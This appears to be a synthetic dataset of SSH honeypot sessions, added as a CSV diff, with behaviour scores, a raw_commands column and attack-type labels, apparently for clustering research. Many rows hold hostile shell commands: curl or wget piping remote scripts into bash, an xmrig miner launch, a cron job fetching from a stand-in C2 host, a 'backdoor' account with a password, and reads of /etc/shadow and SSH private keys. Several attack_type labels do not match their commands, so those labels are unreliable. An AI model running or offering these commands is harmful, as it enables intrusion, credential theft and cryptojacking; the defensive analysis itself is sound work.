@@ -1,0 +1,501 @@
+session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands,cluster,attack_type
+f02b499c9caa40bf,159.89.49.114,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8488779712944309,211.94.20.175,China,5,1,3,27,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+6ade2e1b6fe94b19,68.183.39.102,United States,5,1,3,26,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+8ac2079061af41a3,91.240.118.172,Ukraine,2,1,2,17,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+0b9e152c561548b5,218.92.0.158,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+513b1fe923b240cf,92.255.57.210,Russia,2,1,3,19,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+2bcfd10de3a244df,167.71.13.196,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ff885934e2544f8f,5.188.86.172,Russia,2,1,3,17,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+cf1491ff7dcf45f7,134.209.82.19,United States,5,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+cb630289cabf4b09,80.82.77.139,Netherlands,4,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+7b6b5049fcdd4c47,91.240.118.172,Ukraine,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+53aaf0ec395b4f78,193.32.162.8,Russia,5,1,2,22,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+2e8c62820e2d4ce6,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8c1fe911eeba42b8,218.92.0.158,China,3,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+6566a47da1754641,104.236.198.48,United States,2,1,2,24,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+c7110b98b2e74153,218.92.0.158,China,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5957c1d1fb864505,58.218.211.36,China,1,1,1,12,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+74c3cfbdc0194d76,68.183.39.102,United States,4,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e02f7eb40f244ab5,198.199.65.32,United States,2,1,2,14,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+ee5a4fe4e07b4975,5.188.86.172,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+1474113296584bec,45.142.212.100,Netherlands,4,1,5,26,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+26c784b787ff4d7a,179.60.150.100,Brazil,3,1,3,27,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+487d0a2af92343d6,164.92.98.77,United States,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+a151e051b9df4b1b,206.189.32.177,United States,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+d74a64d859b043ad,134.209.82.19,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+61db3f73b32341fe,193.32.162.8,Russia,4,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+c385c8a24c2449d7,138.197.148.152,United States,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+b30cd930639a4f51,206.189.32.177,United States,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+dbb3a85e3fb548cf,159.89.49.114,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+333374451b03490f,193.32.162.8,Russia,3,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+ed432191fa4d4dd5,103.99.0.122,India,5,1,1,20,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+a0e8366ad78f4319,68.183.39.102,United States,1,1,3,14,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+7297985c512547ab,198.199.65.32,United States,2,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+a487154c5243478c,58.218.211.36,China,2,1,5,29,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+9df7496d198a4a7b,179.60.150.100,Brazil,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+f5c68d6f2a1740d3,222.186.15.101,China,1,1,2,13,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+e2446dd6a4344be6,164.92.98.77,United States,3,1,2,17,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+5598f4115f7444b6,138.197.148.152,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+018889d236674586,117.21.191.131,China,1,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+b3018f065889480e,134.209.82.19,United States,4,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+17b2417919c24293,194.165.16.11,Russia,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+51821b395add458b,134.209.82.19,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8a478cf868174c43,206.189.32.177,United States,1,1,1,6,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+847c6248ecaa4814,92.255.57.210,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ef8cbc0505574fc5,157.245.108.55,United States,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+4f4e03e1784b4414,104.236.198.48,United States,1,1,3,22,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+baa41527f04741cc,211.94.20.175,China,1,1,3,12,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+e4a8639cf9c74b07,80.82.77.139,Netherlands,4,1,5,45,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+0487e30357e246ea,179.60.150.100,Brazil,5,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+01e7949ef641473b,91.240.118.172,Ukraine,4,1,2,19,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+f1b96586b8af4e72,211.94.20.175,China,4,1,1,26,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+78d2c74c51fc4170,206.189.32.177,United States,2,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+0f4cc75365c5418e,185.220.101.45,Germany,3,1,5,34,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+3307ef93e00345df,45.142.212.100,Netherlands,2,1,3,15,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+b2607ea336ab4ea3,167.71.13.196,United States,5,0,0,18,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+74f110a327914ee8,167.71.13.196,United States,5,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+912766bbbc624454,92.255.57.210,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c681be33c01a44e4,167.71.13.196,United States,4,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+e2b049fbeb4b4dad,211.94.20.175,China,1,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+eae6456fb01a4107,92.255.57.210,Russia,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e3191353880e4a9e,211.94.20.175,China,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+ba9a6f02a69a457b,157.245.108.55,United States,5,1,5,29,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+c1fa9b0701f74889,198.199.65.32,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e53e8ea5cdb54dc5,206.189.32.177,United States,3,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+6916f367af8a4b8a,178.128.21.44,Singapore,3,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+153c1d370b2b4eaa,117.21.191.131,China,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+09d80a2c7141428e,157.245.108.55,United States,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+df1413f97f8b4681,117.21.191.131,China,2,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+08fffaa5158d4759,198.199.65.32,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3406787548834ebd,180.129.12.93,China,1,1,2,8,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+5559199f056346d0,167.71.13.196,United States,3,1,5,28,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+05caf312752e4545,185.220.101.45,Germany,3,1,5,32,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+45517c7178ef4ad4,179.60.150.100,Brazil,4,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+7cb0a4a014c64432,103.99.0.122,India,3,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+df2d7b864d6648a3,103.99.0.122,India,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+04a3a160fc114be0,5.188.86.172,Russia,3,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+e86c5816c18a4efc,134.209.82.19,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ab67d871dd7d45a2,138.197.148.152,United States,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+cde0aa493d59492a,179.60.150.100,Brazil,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+d10ca53e0fa84f90,179.60.150.100,Brazil,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+1bdb761b83214590,92.255.57.210,Russia,5,1,5,33,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+76fc4f1de2be4d32,179.60.150.100,Brazil,4,1,5,35,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+ada3b2a06ef54517,45.95.147.236,Netherlands,3,1,5,30,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+c579f4cf7bff423d,178.128.21.44,Singapore,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5671fd6bcbbd4ca7,222.186.15.101,China,4,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+3a17d49c1b1b4eb8,138.197.148.152,United States,3,1,1,13,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+0ae903df35d9449a,179.60.150.100,Brazil,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c7fd62fa79644fc1,159.89.49.114,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+90339c3dd4644db0,193.32.162.8,Russia,1,1,5,31,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+519258f815be4d55,179.60.150.100,Brazil,3,1,2,18,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+2d09b5ac409941d9,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5c4f4defb2bc4c50,164.92.98.77,United States,2,1,1,9,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+af2a0f7c151c4ac6,134.209.82.19,United States,1,1,1,5,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+c2aed1ad51324152,117.21.191.131,China,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+d1e6665dc32040d4,206.189.32.177,United States,3,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+3aee130fdcb84cbd,157.245.108.55,United States,5,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+14d1a908749040c4,164.92.98.77,United States,1,1,3,19,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+61d9ddd78d7e4621,179.60.150.100,Brazil,3,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+65e23bee21144d26,117.21.191.131,China,2,1,5,22,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+41df14acefbd42e0,218.92.0.158,China,3,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+0035097c53b848f3,193.32.162.8,Russia,5,1,2,19,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+080d6f44ac154fa5,206.189.32.177,United States,5,1,1,14,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+dce0d1534b884b40,117.21.191.131,China,5,1,5,45,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+0016ab51560c440d,117.21.191.131,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+01f8abbdbaad4726,222.186.15.101,China,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+966c075b3ffa48c8,194.165.16.11,Russia,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+9fcd2a4a27634989,117.21.191.131,China,1,1,2,19,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+c6f4a10b9a864566,80.82.77.139,Netherlands,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+911aed12d14c4323,180.129.12.93,China,4,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+aa12a3b7a9a84805,5.188.86.172,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+b7ef840dedef4693,194.165.16.11,Russia,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+304821c11ba044d3,138.197.148.152,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ec7f878c6f664902,58.218.211.36,China,5,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a09d1998cdb14612,164.92.98.77,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c1b88c6da82b4aad,68.183.39.102,United States,5,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+656e8c28edca440e,138.197.148.152,United States,3,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+ba4a07e941394cad,159.89.49.114,United States,1,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+1d2101a1b0d64e7a,91.240.118.172,Ukraine,2,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+cd6f187866274549,178.128.21.44,Singapore,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c0490800bcf94465,117.21.191.131,China,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a1eeeab958ed4df4,91.240.118.172,Ukraine,5,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+244f667e609f41a5,45.142.212.100,Netherlands,2,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a8d59116af3e4eb3,103.99.0.122,India,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+2f0b5e189fb54ca4,68.183.39.102,United States,3,1,5,25,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
+6143bca29125421a,138.197.148.152,United States,3,1,1,9,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+e9758b613c8b4c81,164.92.98.77,United States,4,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+4f768a05221c4e82,91.240.118.172,Ukraine,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+801bb1b6b0654435,198.199.65.32,United States,3,1,3,15,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+f3f4315925754aea,45.142.212.100,Netherlands,5,1,2,22,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+5f3edda98f634708,80.82.77.139,Netherlands,5,1,1,21,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+044a3266781f4e18,164.92.98.77,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a23c80f11f98465e,157.245.108.55,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+22e5983dbfd64290,138.197.148.152,United States,1,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
+ccfe5fe24bd04343,198.199.65.32,United States,2,1,2,17,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+b96fbedb6eba4a02,134.209.82.19,United States,5,0,0,19,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ebe59d567b5145ba,91.240.118.172,Ukraine,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+66d0a1e8eb9545a1,206.189.32.177,United States,2,1,1,13,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+45490a32144445f3,193.32.162.8,Russia,4,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8d969021a7de41fb,193.32.162.8,Russia,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+738b9a59ea9d4bb6,180.129.12.93,China,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+9a81ced07ba14016,206.189.32.177,United States,3,1,3,20,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+413c7847e081483d,134.209.82.19,United States,1,1,3,13,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+7a33412941204eb2,104.236.198.48,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+b19a533cde4e4fe6,58.218.211.36,China,5,1,5,46,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+171143c597564c08,117.21.191.131,China,2,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+84b8f112880a4aeb,92.255.57.210,Russia,2,1,2,15,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
+00d51fd8202f4b27,198.199.65.32,United States,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+3edcf2c9211346d4,164.92.98.77,United States,2,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
+41a0161995404e29,194.165.16.11,Russia,4,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5d7eb1828658425a,138.197.148.152,United States,2,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+973ddaae6abf469f,222.186.15.101,China,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+238f8bfa75da4153,5.188.86.172,Russia,1,1,1,9,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
+c737cc683f61437e,206.189.32.177,United States,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ea5e231ab0e14c3a,194.165.16.11,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+499a2da64aed4167,179.60.150.100,Brazil,5,1,2,31,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+22ae61783e5c45db,138.197.148.152,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+e3f865127662460a,92.255.57.210,Russia,3,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+cb8e26b275f04935,198.199.65.32,United States,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+ab24894e82984183,167.71.13.196,United States,4,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+979903c3cf444c70,222.186.15.101,China,5,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
+3c73351bcd9143ed,45.95.147.236,Netherlands,4,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
+20d62d9e1c4a4b43,104.236.198.48,United States,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+c7ab7f656f7a41fe,179.60.150.100,Brazil,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5370277303e242ae,80.82.77.139,Netherlands,5,1,3,22,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+06fcc33b1e854043,211.94.20.175,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+a3ad4b645a4147ed,138.197.148.152,United States,5,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
+39ec2c04bdca4e89,178.128.21.44,Singapore,3,1,3,20,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+8b5cc8d6f0884271,222.186.15.101,China,4,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
+3d0c9556a4994766,164.92.98.77,United States,4,1,3,27,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
+a8da5ebf97bf4697,222.186.15.101,China,5,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+d464c4f5ec8b4a3f,211.94.20.175,China,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
+e43a9956661c4c57,45.142.212.100,Netherlands,5,1,2,15,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
+5c6a475b218f4aeb,117.21.191.131,China,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+5d30b2231c404434,68.183.39.102,United States,4,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
+058ea00a332e482b,178.128.21.44,Singapore,3,1,1,16,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+9e399d3b1c064073,211.94.20.175,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+48870e2d2a4c4e0a,45.142.212.100,Netherlands,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+8cb4920bfe7741a7,159.89.49.114,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+6a9745de8e414c02,92.255.57.210,Russia,1,1,1,6,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
+a3effc2445454242,80.82.77.139,Netherlands,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+7735b4b14a554aa9,193.32.162.8,Russia,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+47fe64430bf948d8,206.189.32.177,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+02b097aa1d0e43de,167.71.13.196,United States,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+956116d37ef7415d,58.218.211.36,China,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
+aaa720a93cc24c31,91.240.118.172,Ukraine,1,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
+53a19fc9833c40d7,159.89.49.114,United States,1,1,3,18,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
